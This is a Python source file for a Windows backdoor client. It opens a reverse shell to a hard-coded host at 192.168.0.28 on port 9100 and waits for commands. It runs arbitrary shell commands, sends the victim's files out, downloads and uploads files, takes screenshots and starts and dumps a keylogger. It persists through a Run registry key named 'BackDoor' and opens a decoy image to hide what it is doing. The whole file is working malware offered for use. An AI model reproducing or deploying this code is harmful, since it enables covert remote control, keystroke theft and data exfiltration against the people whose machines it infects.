import base64
import multiprocessing
import shutil
import socket
import subprocess
import json
import time
import sys
import os
import shutil
import traceback
import requests
from mss import mss
import ctypes

from MyLogger import main
import threading

def reliable_send(data):
    json_data=json.dumps(data)
    sock.send(json_data.encode())


def reliable_recieve():
    json_dat=""
    while True:
        try:
            json_dat=json_dat+sock.recv(1024).decode()
            return json.loads(json_dat)

        except ValueError:
            continue

def screenshot():
    with mss() as screenshot:
        screenshot.shot()



def byte_sender(data):
    sock.send(data)

def size_sender(size):
    sock.send(size.encode())

def download(url):
    get_response=requests.get(url)
    file_name=url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_response.content)


def is_admin():
    global admin
    try:
        temp=os.listdir(os.sep.join(os.environ.get('SystemRoot','C:\\windows'),'temp'))
    except:
        admin=False
    else:
        admin=True

path = os.environ["appdata"] + "\\Processes.txt"

def shell():
    global path

    while True:
        # recieves the message from the server
        command = '';
        command = reliable_recieve()


        if command == "exit":
            try:
              os.remove(path)
            except:
                break
            break
            sys.exit("Exited")
        elif command[:2] == "cd" and len(command)>1:
            try:
                os.chdir(command[3:])
            except:
                reliable_send("The directory doesn't exist!")
                continue

        elif command[:8]=="download":
            try:
                with open(command[9:],"rb") as file:

                     encoded=base64.b64encode(file.read())
                     size=sys.getsizeof(encoded)
                     size_sender(str(size))
                     byte_sender(encoded)

            except:
                reliable_send("The directory doesn't exist!")
                continue


        elif command[:3] == "get":

            try:
                download(command[4:])
                reliable_send("[+] Download finished!")
            except:
                reliable_send("[!!] Failed to download")
        elif command[:11] == "keylog_dump":

 #           try:


                with open(path, "r") as f:
                    txt = ''' '''
                    data = f.readlines()
                    for line in data:
                        txt = txt + line + '''\n'''
                    f.close()
                print(txt)
                reliable_send(txt)

 #           except:
 #               traceback.print_exc()
   #             reliable_send("Sending the file failed!")

        elif command[:4] == "help":
            help_options=''' 
                              download <path> -> downloading a file from the target's PC.
                              upload <path> -> upload a file to target PC.
                              get <url> -> download a file to the target's PC from the Internet.
                              screenshot -> take a screenshot from the target's screen
                              start <program's name> -> run a program on target's pc.
                              check -> check for adminastrator privilage.
                              exit -> for exiting the shell
                              '''
            reliable_send(help_options)

            
        elif command[:6] == "upload":
            with open(command[7:],"wb") as fin:

                size=size_getter()
                result=byte_getter(size)
                fin.write(base64.b64decode(result+b'=='))
        elif command[:5]=="start":
            try:
                subprocess.Popen(command[6:],shell=True)
                reliable_send("[+] started!")
            except:
                reliable_send("[!] Failed To Start!")

        elif command[:10]=="screenshot":
            try:
                screenshot()
                with open("monitor-1.png","rb") as sc:
                    encoded=base64.b64encode(sc.read())
                    size = sys.getsizeof(encoded)
                    size_sender(str(size))
                    byte_sender(encoded)

                os.remove("monitor-1.png")

            except:
                reliable_send("Couldn't take a screenshot")


        elif command[:5]=="check":

            try:
              is_admin()
              if admin==True:
                reliable_send("[+] Admin Privilages")
              else:
                reliable_send("[!] User Privilage")
            except:
                reliable_send("Couldn't perform the check")

        elif command[:12]=="keylog_start":
            print("Started")
            t1=threading.Thread(target=main.start)
            t1.start()
            continue



        else:
            try:
                # This executes the command in the victim's shell and sends the result to the server.
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result.decode())
            except :

                reliable_send("Can't execute that!!")



def connection():
    while True:
        try:
         # connect to the server.
          sock.connect(("192.168.0.28", 9100))

          shell()
        except:
            traceback.print_exc()
            print("trying again!! please wait!!")
            time.sleep(10)
            connection()

def byte_getter(size):
    dat=b''
    while True:
        try:
            dat=dat+sock.recv(size)
            return dat
        except :
            continue


def size_getter():
    size= sock.recv(10000000).decode()
    return int(size)

def resource_path(relative):
    return os.path.join(
        os.environ.get(
            "_MEIPASS",
            os.path.abspath(".")
        ),
        relative
    )

location=os.environ["appdata"]+"\\win32Handler.exe"

if not os.path.exists(location):

    shutil.copyfile(sys.executable,location)

    subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "'+location+'"',shell=True)

from pathlib import Path
bundle_dir = Path(getattr(sys, '_MEIPASS', Path.cwd()))
name = bundle_dir / 'ProgrammingIllustration.png'


try:
        subprocess.Popen(str(name),shell=True)
except:
        number=3
        numner=10
        numfin=numner*numner



sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connection()

sock.close()



#Close the connection after it has been established.
#sock.close()